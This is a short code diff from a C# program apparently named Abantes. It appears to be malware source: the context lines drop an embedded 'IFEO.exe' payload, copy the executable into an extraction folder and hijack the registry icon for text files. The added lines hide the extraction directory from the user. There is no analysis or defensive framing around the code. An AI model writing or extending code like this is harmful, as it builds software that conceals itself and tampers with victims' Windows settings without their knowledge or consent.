@@ -36,6 +36,9 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
+                DirectoryInfo ch = new DirectoryInfo(extractPath);
+                ch.Attributes = FileAttributes.Hidden;
+
                 editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
                 editKey.SetValue("", extractPath + "\\icon.ico");
                 editKey.Close();
